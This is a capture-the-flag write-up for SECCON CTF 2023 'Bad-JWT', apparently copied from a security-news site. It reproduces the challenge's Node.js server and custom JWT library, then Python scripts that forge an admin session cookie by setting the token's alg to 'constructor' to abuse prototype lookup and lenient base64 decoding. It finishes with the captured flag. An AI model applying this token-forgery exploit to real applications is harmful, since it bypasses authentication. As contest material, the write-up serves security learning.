# SECCON CTF 2023 Quals – Bad-JWT

> 原文: https://www.ctfiot.com/135314.html
> ID: 135314


```
const FLAG = "SECCON{dummy}";
const PORT = "3000";

const express = require("express");
const cookieParser = require("cookie-parser");
const jwt = require("./jwt");

const app = express();
app.use(express.urlencoded({ extended: false }));
app.use(cookieParser());

const secret = require("crypto").randomBytes(32).toString("hex");

app.use((req, res, next) => {
 try {
 const token = req.cookies.session;
 const payload = jwt.verify(token, secret);
 req.session = payload;
 } catch (e) {
 return res.status(400).send("Authentication failed" + e);
 }
 return next();
});

app.get("/", (req, res) => {
 if (req.session.isAdmin === true) {
 return res.send(FLAG);
 } else {
 return res.status().send("You are not admin!");
 }
});

app.listen(PORT, () => {
 const admin_session = jwt.sign("HS512", { isAdmin: true }, secret);
 console.log(`[INFO] Use ${admin_session} as session cookie`);
 console.log(`Challenge server listening on port ${PORT}`);
});
const crypto = require("crypto");

const base64UrlEncode = (str) => {
 return Buffer.from(str)
 .toString("base64")
 .replace(/=*$/g, "")
 .replace(/\+/g, "-")
 .replace(/\//g, "_");
};

const base64UrlDecode = (str) => {
 return Buffer.from(str, "base64").toString();
};

const algorithms = {
 hs256: (data, secret) =>
 base64UrlEncode(crypto.createHmac("sha256", secret).update(data).digest()),
 hs512: (data, secret) =>
 base64UrlEncode(crypto.createHmac("sha512", secret).update(data).digest()),
};

const stringifyPart = (obj) => {
 return base64UrlEncode(JSON.stringify(obj));
};

const parsePart = (str) => {
 return JSON.parse(base64UrlDecode(str));
};

const createSignature = (header, payload, secret) => {
 const data = `${stringifyPart(header)}.${stringifyPart(payload)}`;
 const signature = algorithms[header.alg.toLowerCase()](data, secret);
 return signature;
};

const parseToken = (token) => {
 const parts = token.split(".");
 if (parts.length !== 3) throw Error("Invalid JWT format");

 const [header, payload, signature] = parts;
 const parsedHeader = parsePart(header);
 const parsedPayload = parsePart(payload);

 return { header: parsedHeader, payload: parsedPayload, signature };
};

const sign = (alg, payload, secret) => {
 const header = {
 typ: "JWT",
 alg: alg,
 };

 const signature = createSignature(header, payload, secret);

 const token = `${stringifyPart(header)}.${stringifyPart(
 payload
 )}.${signature}`;
 return token;
};

const verify = (token, secret) => {
 const { header, payload, signature: expected_signature } = parseToken(token);

 const calculated_signature = createSignature(header, payload, secret);

 const calculated_buf = Buffer.from(calculated_signature, "base64");
 const expected_buf = Buffer.from(expected_signature, "base64");

 if (Buffer.compare(calculated_buf, expected_buf) !== 0) {
 throw Error("Invalid signature");
 }

 return payload;
};

module.exports = { sign, verify };
const token = req.cookies.session;
const verify = (token, secret) => {
 const { header, payload, signature: expected_signature } = parseToken(token);

 const calculated_signature = createSignature(header, payload, secret);
+ console.log({calculated_signature, expected_signature})

 const calculated_buf = Buffer.from(calculated_signature, "base64");
 const expected_buf = Buffer.from(expected_signature, "base64");

 if (Buffer.compare(calculated_buf, expected_buf) !== 0) {
 throw Error("Invalid signature");
 }

 return payload;
};
import base64
import requests
import json

header = {"typ": "JWT", "alg": "HS256"}
headerStr = json.dumps(header).encode("utf-8")
body = {"isAdmin": True}
bodyStr = json.dumps(body).encode("utf-8")

def base64_encode(str:
str):
 return base64.b64encode(str).replace(b"=", b"").replace(b"+", b"-").replace(b"/", b"_")

headerBase64 = str(base64_encode(headerStr))[2:-1]
bodyBase64 = str(base64_encode(bodyStr))[2:-1]

jwt = f"{headerBase64}.{bodyBase64}.ここにシグネチャを入れる"

res = requests.get("http://localhost:
3000/", cookies={"session": jwt})

print(res.text)
const createSignature = (header, payload, secret) => {
 const data = `${stringifyPart(header)}.${stringifyPart(payload)}`;
 const signature = algorithms[header.alg.toLowerCase()](data, secret);
 return signature;
};
import base64
import requests
import json

header = {"typ": "JWT", "alg": "constructor"}
headerStr = json.dumps(header).encode("utf-8")
body = {"isAdmin": True}
bodyStr = json.dumps(body).encode("utf-8")

def base64_encode(str: str):
 return (
 base64.b64encode(str).replace(b"=", b"").replace(b"+", b"-").replace(b"/", b"_")
 )

headerBase64 = str(base64_encode(headerStr))[2:-1]
bodyBase64 = str(base64_encode(bodyStr))[2:-1]

jwt = f"{headerBase64}.{bodyBase64}.foo"

res = requests.get("http://localhost:
3000/", cookies={"session": jwt})

print(res.text)
{
 expected_signature: 'foo',
 calculated_signature: [String: 'eyJ0eXAiOiJKV1QiLCJhbGciOiJjb25zdHJ1Y3RvciJ9.eyJpc0FkbWluIjp0cnVlfQ']
}
jwt = f"{headerBase64}.{bodyBase64}.eyJ0eXAiOiJKV1QiLCJhbGciOiJjb25zdHJ1Y3RvciJ9.eyJpc0FkbWluIjp0cnVlfQ"
class Foo {
 [Symbol.toPrimitive]() {
 return "ABC";
 }
}

const buf1 = Buffer.from(new Foo());

console.log({ buf1 }); // { buf1:  }
class Foo {
 [Symbol.toPrimitive]() {
 return "eyJ0eXAiOiJKV1QiLCJhbGciOiJjb25zdHJ1Y3RvciJ9";
 }
}
class Bar {
 [Symbol.toPrimitive]() {
 // add $^.
 return "eyJ0eXAi$O$iJK^V1&Qi.LCJh.&bGc.i^Oi.Jjb.25z^dHJ1Y3RvciJ9"; // ^^
 }
}

const buf1 = Buffer.from(new Foo(), "base64");
const buf2 = Buffer.from(new Bar(), "base64");

console.log({ buf1, buf2 });
//{
// buf1: ,
// buf2: 
//}
jwt = f"{headerBase64}.{bodyBase64}.eyJ0eXAiOiJKV1QiLCJhbGciOiJjb25zdHJ1Y3RvciJ9eyJpc0FkbWluIjp0cnVlfQ"
{
 expected_signature: 'eyJ0eXAiOiJKV1QiLCJhbGciOiJjb25zdHJ1Y3RvciJ9eyJpc0FkbWluIjp0cnVlfQ',
 calculated_signature: [String: 'eyJ0eXAiOiJKV1QiLCJhbGciOiJjb25zdHJ1Y3RvciJ9.eyJpc0FkbWluIjp0cnVlfQ'],
 calculated_buf: ,
 expected_buf: 
}
import base64
import requests
import json

header = {"typ": "JWT", "alg": "constructor"}
headerStr = json.dumps(header).encode("utf-8")
body = {"isAdmin": True}
bodyStr = json.dumps(body).encode("utf-8")

def base64_encode(str: str):
 return (
 base64.b64encode(str).replace(b"=", b"").replace(b"+", b"-").replace(b"/", b"_")
 )

headerBase64 = str(base64_encode(headerStr))[2:-1]
bodyBase64 = str(base64_encode(bodyStr))[2:-1]

jwt = f"{headerBase64}.{bodyBase64}.eyJ0eXAiOiJKV1QiLCJhbGciOiJjb25zdHJ1Y3RvciJ9eyJpc0FkbWluIjp0cnVlfQ"

res = requests.get("http://bad-jwt.seccon.games:
3000", cookies={"session": jwt})

print(res.text)
SECCON{Map_and_Object.prototype.hasOwnproperty_are_good}
```
